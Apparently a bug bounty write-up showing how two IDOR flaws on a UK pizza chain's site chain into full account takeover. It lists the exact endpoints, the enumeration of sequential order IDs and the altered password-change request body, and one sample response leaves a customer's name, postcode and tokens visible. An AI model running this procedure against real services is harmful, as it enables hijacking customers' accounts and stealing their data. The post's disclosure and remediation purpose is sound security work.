---
title: "TopsPizza: Account Takeover via IDOR in Change Password"
date: 2026-10-20 00:00:00 +0000
categories: [Web, IDOR]
tags: [bugbounty, idor, account-takeover, business-logic, fixed]
---

## Target

Tops Pizza is a British pizza takeaway chain founded in 1988, now operating dozens of stores across the UK. As of 2026 it runs 87 locations in the United Kingdom, with customers placing orders and managing their accounts, including saved details and order history, through `topspizza.co.uk`.

- **Program:** TopsPizza
- **Endpoint:** `POST /api/customers`
- **Vulnerability class:** IDOR (CWE-639: Authorization Bypass Through User-Controlled Key)
- **Impact:** Full Account Takeover (no victim interaction required)


## Summary

The password change endpoint on `topspizza.co.uk` accepts an encrypted `id` parameter identifying which account's password should be updated. The endpoint correctly validates the `current_password` field, but **never verifies that the `id` belongs to the authenticated session**.
 
That `id` can be harvested from a second, independent IDOR: the order details endpoint (`/api/orders/{order_id}`) uses a **sequential, numeric order ID** and discloses the owning customer's encrypted `customer_id` in its response, regardless of who is requesting it. By enumerating order IDs, an attacker can collect valid `customer_id` tokens belonging to other users, then feed one into the password-change request to take over that account.

## Steps to Reproduce

1. Harvest a victim's `customer_id` via IDOR on order details**
 
Request any order by incrementing/decrementing the numeric order ID, regardless of ownership:
 
```
GET https://topspizza.co.uk/api/orders/2178944
```
![IDOR](/assets/img/posts/idor-topspizza.png)

Others users data (ID):

![Change password form](/assets/img/posts/OTHER-USERS.png)
 
The response discloses order and customer details without checking that the requester owns the order, including the victim's encrypted `customer_id`:
 
```json
{
  "customer_id": "eyJpdiI6IkhzemNiYUJGM0NTVEFkRVBxVDBPT1E9PSIsInZhbHVlIjoicmd5RXd4cHYxQUMyMnRWUVdPQlpyQT09IiwibWFjIjoiMzcyYWVjMjhlYzRhYjM0NTcxNzQ3MmQ2NWViYzI5ZWQyZGE3MWU0ZGFkYWQ2OGZiMjc3ZTVhYTBjNmU3OWQ1ZSIsInRhZyI6IiJ9",
  "status": "payment_pending",
  "payment_type": "card",
  "total": "13.91",
  "created_at": "2026-05-03 10:41:36",
  "address": {
    "customer": "alexa",
    "customer_id": "eyJpdiI6Ik4xMHdhb3pwUlFYY01pRHZLaEdWbVE9PSIsInZhbHVlIjoiYXdNbUpxNG81RWxYU3h1bkJoTm1Zdz09IiwibWFjIjoiZTM4ZjkxMTU3NDExZjk2ZDBkNzc1YTQ2ODliODNiMjZhM2VjMWQ1NDcyZTM1MTY0MDJkYjM0ODUzNWE5YmZhOCIsInRhZyI6IiJ9",
    "postcode": "M402AQ"
  }
}
```
 
Because order IDs are sequential, an attacker can iterate through them and build a list of valid `customer_id` tokens for arbitrary accounts, no authorization check ties the order to the requesting session.

Now Log in to `topspizza.co.uk` and navigate to **Settings → Change your password**.

![Change password form](/assets/img/posts/profile-change-pass.png)

2. Intercept the password-change request with a proxy (Burp Suite).

![Change password form](/assets/img/posts/change-pass-request.png)

The request body looks like:

   ```json
   {
     "id": "eyJpdiI6IjhMRUFGemdoTEFQZ25wM280XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXJ9",
     "current_password": "YOUR_CURRENT_PASSWORD",
     "new_password": "NEW_PASSWORD_HERE"
   }
   ```

6. The `id` field is an encrypted (Laravel-style) token. A separate IDOR in the **order history** endpoint discloses this same `id`/`customer_id` token for *other* users' orders,k so an attacker can harvest valid `id` values belonging to other customers without needing their password.
7. Replace the `id` value in the password-change request with the harvested `id` belonging to another account, keeping `current_password` as **the attacker's own** current password and setting any `new_password`.

![Change password form](/assets/img/posts/OTHER-ATO.png)

8. Send the request. The server responds with `200 OK` and confirms the change, critically, the response also leaks the victim's PII (name, email) tied to that account:

   ```json
   {
     "status": "Success",
     "message": "Password updated successfully",
     "data": {
       "id": "eyJpdiI6...",
       "hashedId": "7f2e52b3ebcab822976b72ee717f15f4",
       "customer_id": "eyJpdiI6...",
       "first_name": "REDACTED",
       "last_name": "REDACTED",
       "name": "REDACTED",
       "email": "REDACTED"
     }
   }
   ```

9. Using the email returned in the response and the attacker-chosen `new_password`, log in as the victim, confirming full account takeover.

![Change password form](/assets/img/posts/OTHER-LOGIN.png)

BOOOOOM -> ATO

![Change password form](/assets/img/posts/OTHER-USER-DATA.png)


## Impact
- **Full Account Takeover** of any customer account, without knowing their original password.
- The response body additionally discloses the victim's **name and email**, compounding the issue with a PII leak.
- The order-details IDOR allows **enumeration at scale**: sequential order IDs mean an attacker can mass-harvest valid `customer_id` tokens and chain them into account takeovers across many accounts with no interaction from any victim.
- Because the affected platform is a food ordering service, impact extends to stored addresses, order history, and potentially saved payment methods.
Once an account is taken over, the attacker fully impersonates the victim and can:
 
- **Log in as the victim** using the attacker-set password.
- **View the victim's full order history**, including delivery addresses and past purchases.
- **Change account data** (name, phone number, saved address, etc.).
- **Delete the victim's account** outright, denying them access permanently.
- **Abuse the victim's loyalty/reward points**: Tops Pizza awards points for frequent orders, which can be redeemed for free pizza. An attacker can place orders on the victim's account and redeem accumulated rewards for free food at the victim's expense, with no payment of their own.
## Root Cause
 
Two separate endpoints fail to enforce object-level authorization:
 
1. `/api/orders/{order_id}` returns full order and customer data for **any** order ID, without checking that the order belongs to the requesting session.
2. `/api/customers` (password update) validates `current_password` against the **authenticated session's** account, but applies the update to whatever account the `id` parameter references, instead of deriving the target account from the session itself.
Together, these two IDORs chain into a reliable, scalable account takeover primitive.
 
## Remediation
 
- On `/api/orders/{order_id}`, verify server-side that the requested order belongs to the authenticated session before returning any data.
- On `/api/customers`, derive the target account strictly from the authenticated session (JWT/session cookie), never from a client-supplied `id`, or, if an `id` must be present, enforce that it matches the session's own account before processing the update.
- Avoid returning other customers' PII (`email`, `first_name`, `last_name`) in any response outside the owner's own session context.

## Timeline

| Date | Event |
|------|-------|
| 2026-10-20 | Reported to TopsPizza |
| — | Fixed |

---

*Disclosed with permission from TopsPizza after remediation. Victim PII redacted from this writeup; testing was performed only against accounts under the researcher's control.*
